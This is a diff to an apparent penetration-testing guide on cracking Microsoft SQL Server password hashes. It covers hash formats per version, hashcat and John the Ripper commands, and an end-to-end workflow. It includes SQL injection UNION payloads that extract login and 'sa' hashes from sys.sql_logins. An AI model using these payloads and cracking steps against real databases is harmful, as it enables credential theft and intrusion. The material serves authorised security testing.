@@ -4,7 +4,7 @@ description: Techniques for cracking Microsoft SQL Server password hashes
 category: Authentication
 order: 18
 tags: ["password cracking", "hash", "authentication"]
-lastUpdated: 2025-03-15
+lastUpdated: 2026-10-08
 ---
 
 After extracting password hashes from Microsoft SQL Server, the next step in a penetration test is often to attempt cracking these hashes to recover plaintext passwords. This knowledge can be valuable for lateral movement, privilege escalation, or accessing other systems where credentials might be reused.
@@ -13,23 +13,25 @@ After extracting password hashes from Microsoft SQL Server, the next step in a p
 
 Before attempting to crack SQL Server password hashes, it's important to identify the hash type based on its format:
 
-| SQL Server Version | Hash Format                    | Example                                                                        |
-| ------------------ | ------------------------------ | ------------------------------------------------------------------------------ |
-| SQL Server 2000    | 0x0100\[16-byte hash\]         | 0x0100B58E58130D2B6FF57F70737D3978                                             |
-| SQL Server 2005+   | 0x0200\[SHA-1 hash\]\[salt\]   | 0x020058CD420B993C1C32561C772608D549FCEDFA66C8B733C3270DD8D3D32385D6580A6D367B |
-| SQL Server 2012+   | 0x0200\[SHA-512 hash\]\[salt\] | (longer hash with same prefix)                                                 |
+| SQL Server Version      | Hash Format                                   | Length   | Hashcat mode |
+| ----------------------- | --------------------------------------------- | -------- | ------------ |
+| SQL Server 2000         | 0x0100\[salt\]\[SHA-1\]\[SHA-1 of uppercase\] | 46 bytes | 131          |
+| SQL Server 2005-2008 R2 | 0x0100\[salt\]\[SHA-1\]                       | 26 bytes | 132          |
+| SQL Server 2012-2022    | 0x0200\[salt\]\[SHA-512\]                     | 70 bytes | 1731         |
+| SQL Server 2025         | 0x0300, PBKDF2-SHA-512 (100,000 iterations)   | 70 bytes | 36601        |
+
+The salt is 4 bytes. See [Password Hashing](/mssql/password-hashing) for the layout. Example of a SQL Server 2005 hash (password `password`): `0x01004086CEB6E0BC04FE5027A51DF29E1CF0B74DD3C33214D9DB`.
 
 ## Cracking Tools
 
 Several tools can be used to crack SQL Server password hashes:
 
-| Tool            | Description                       | Strengths                                                 |
-| --------------- | --------------------------------- | --------------------------------------------------------- |
-| Hashcat         | GPU-accelerated password cracker  | Fast, supports many attack modes, highly customizable     |
-| John the Ripper | CPU-based password cracker        | Well-established, user-friendly, supports many hash types |
-| Metasploit      | Framework with SQL Server modules | Integrated with pentesting workflow                       |
-| SQLPing/SQLPAT  | Specialized SQL Server tools      | SQL Server-specific capabilities                          |
-| Hydra/Medusa    | Online password crackers          | For direct SQL Server authentication attempts             |
+| Tool            | Description                       | Strengths                                                       |
+| --------------- | --------------------------------- | --------------------------------------------------------------- |
+| Hashcat         | GPU-accelerated password cracker  | Fast, supports many attack modes, highly customizable           |
+| John the Ripper | CPU-based password cracker        | Well-established, user-friendly, supports many hash types       |
+| Metasploit      | Framework with SQL Server modules | `mssql_hashdump` extracts hashes, `mssql_login` tests passwords |
+| Hydra/Medusa    | Online password crackers          | For direct SQL Server authentication attempts                   |
 
 ## Hashcat Commands for SQL Server Hashes
 
@@ -37,12 +39,17 @@ Several tools can be used to crack SQL Server password hashes:
 # SQL Server 2000 (hash mode 131)
 hashcat -m 131 -a 0 mssql_hashes.txt wordlist.txt
 
-# SQL Server 2005 (hash mode 132)
+# SQL Server 2005 to 2008 R2 (hash mode 132)
 hashcat -m 132 -a 0 mssql_hashes.txt wordlist.txt
 
-# SQL Server 2012+ (hash mode 1731)
+# SQL Server 2012 to 2022 (hash mode 1731)
 hashcat -m 1731 -a 0 mssql_hashes.txt wordlist.txt
+
+# SQL Server 2025, or 2022 CU12+ with trace flag 4671 (hash mode 36601)
+hashcat -m 36601 -a 0 mssql_hashes.txt wordlist.txt
 ```
+
+Mode 131 recovers the uppercased password from the second half of a SQL Server 2000 hash; try case variations of the result against mode 132 or the full hash. The iterated `0x0300` format is about 100,000 times slower to crack. Mode 36601 is in the hashcat source but not in release 7.1.2, so build hashcat from source; John the Ripper has no format for it.
 
 ## John the Ripper Commands
 
@@ -50,10 +57,10 @@ hashcat -m 1731 -a 0 mssql_hashes.txt wordlist.txt
 # SQL Server 2000
 john --format=mssql mssql_hashes.txt
 
-# SQL Server 2005+
+# SQL Server 2005 to 2008 R2
 john --format=mssql05 mssql_hashes.txt
 
-# SQL Server 2012+
+# SQL Server 2012 to 2022
 john --format=mssql12 mssql_hashes.txt
 ```
 
@@ -98,7 +105,7 @@ hashcat -m 132 -a 3 mssql_hashes.txt ?u?l?l?l?l?l?d?d
 Combining dictionary words with patterns:
 
 ```bash
-# Words from dictionary with up to 4 digits appended
+# Words from dictionary with 4 digits appended
 hashcat -m 132 -a 6 mssql_hashes.txt rockyou.txt ?d?d?d?d
 ```
 
@@ -106,40 +113,28 @@ hashcat -m 132 -a 6 mssql_hashes.txt rockyou.txt ?d?d?d?d
 
 Before cracking, you need to extract hashes. With SQL injection access:
 
+Needs a login with `CONTROL SERVER` (sysadmin) or, on SQL Server 2022+, `VIEW ANY CRYPTOGRAPHICALLY SECURED DEFINITION`; otherwise `password_hash` is `NULL`. String context, original query returns 2 string columns:
+
 ```sql
--- Direct extraction as sysadmin
-' UNION SELECT name, CAST(password_hash AS varchar(max)) FROM sys.sql_logins--
+-- Direct extraction (style 1 returns the hash as a 0x... hex string)
+' UNION SELECT name, CONVERT(varchar(max), password_hash, 1) FROM sys.sql_logins--
 
 -- Retrieving SA password hash
-' UNION SELECT name, CAST(password_hash AS varchar(max)) FROM sys.sql_logins WHERE name = 'sa'--
+' UNION SELECT name, CONVERT(varchar(max), password_hash, 1) FROM sys.sql_logins WHERE name = 'sa'--
 ```
+
+Casting `password_hash` to `varchar` instead of converting it with style 1 returns the raw bytes as characters, which is unusable.
 
 ## Format Conversion for Cracking Tools
 
-SQL Server hashes often need to be reformatted for cracking tools:
+Hashcat and John take the hash exactly as `CONVERT(varchar(max), password_hash, 1)` prints it, `0x` prefix included, with no separator between salt and hash:
 
-### SQL Server 2000 Format
+```text
+# Hashcat input (one hash per line)
+0x01004086CEB6E0BC04FE5027A51DF29E1CF0B74DD3C33214D9DB
 
-```markdown
-# Original format
-
-0x0100B58E58130D2B6FF57F70737D3978
-
-# Hashcat format (just remove 0x)
-
-0100B58E58130D2B6FF57F70737D3978
-```
-
-### SQL Server 2005+ Format
-
-```markdown
-# Original format
-
-0x020058CD420B993C1C32561C772608D549FCEDFA66C8B733C3270DD8D3D32385D6580A6D367B
-
-# Hashcat format (remove 0x and separate hash and salt)
-
-020058CD420B993C1C32561C772608D549FCEDFA:66C8B733C3270DD8D3D32385D6580A6D367B
+# With the login name: John reads "login:hash", hashcat needs --username
+sa:0x01004086CEB6E0BC04FE5027A51DF29E1CF0B74DD3C33214D9DB
 ```
 
 ## Common Default and Weak Passwords
@@ -159,12 +154,12 @@ SQL Server's password policies affect cracking success:
 
 1. When `CHECK_POLICY = ON`, passwords must meet Windows complexity requirements:
    - At least 8 characters
-   - Mix of uppercase, lowercase, numbers, and symbols
-   - Not include username
+   - Characters from three of: uppercase, lowercase, digits, symbols
+   - Not containing the login name
 
 2. Without policy enforcement (`CHECK_POLICY = OFF`), simpler passwords might be used
 
-3. SQL Server 2019+ may use additional security features making cracking more difficult
+3. SQL Server 2025 hashes with 100,000 PBKDF2 iterations, which makes offline cracking orders of magnitude slower
 
 ## Optimizing Cracking Performance
 
@@ -196,38 +191,33 @@ john --format=mssql05 --session=sqlserver mssql_hashes.txt
 1. **Extract hashes**:
 
    ```sql
-   -- Extract all hashes to a file
-   SELECT 'sa:0x' + CONVERT(varchar(max), password_hash, 2) FROM sys.sql_logins;
+   -- One "login:hash" line per SQL login, saved as sql_hashes.txt
+   SELECT name + ':' + CONVERT(varchar(max), password_hash, 1) FROM sys.sql_logins WHERE password_hash IS NOT NULL;
    ```
 
-2. **Format hashes properly**:
-
-   ```bash
-   # Script to convert SQL Server 2005+ hashes to hashcat format
-   cat sql_hashes.txt | sed 's/0x0200\([0-9A-F]*\)/0200\1/g' | sed 's/\(.\{40\}\)\(.*\)/\1:\2/g' > formatted_hashes.txt
-   ```
+2. **Pick the mode from the header**: `0x0300` is mode 36601, `0x0200` is mode 1731, `0x0100` with 26 bytes is mode 132.
 
 3. **Run cracking tools**:
 
    ```bash
-   hashcat -m 132 -a 0 formatted_hashes.txt rockyou.txt -r rules/best64.rule
+   hashcat -m 1731 -a 0 --username sql_hashes.txt rockyou.txt -r rules/best64.rule
    ```
 
 4. **Check results**:
 
    ```bash
-   hashcat -m 132 formatted_hashes.txt --show
+   hashcat -m 1731 --username sql_hashes.txt --show
    ```
 
 ## Special SQL Server Password Considerations
 
-1. **Case Sensitivity**: SQL Server login passwords are case-sensitive by default
+1. **Case Sensitivity**: SQL Server login passwords are case-sensitive; only the SQL Server 2000 format also stores a case-insensitive hash
 
 2. **Unicode Support**: SQL Server supports Unicode passwords, significantly increasing the password space
 
-3. **Clear-Text Caching**: SQL Server may cache passwords in memory, creating additional attack vectors beyond hash cracking
+3. **Reversible Secrets**: Linked server and credential passwords are not hashed but encrypted with the service master key; a sysadmin on the host can decrypt them through the dedicated admin connection
 
-4. **Salting**: SQL Server 2005+ uses salting, making rainbow table attacks ineffective
+4. **Salting**: every format, including SQL Server 2000, uses a per-password salt, making rainbow table attacks ineffective
 
 5. **Service Account Reuse**: Often, SQL Server service accounts have their passwords reused across multiple services
 
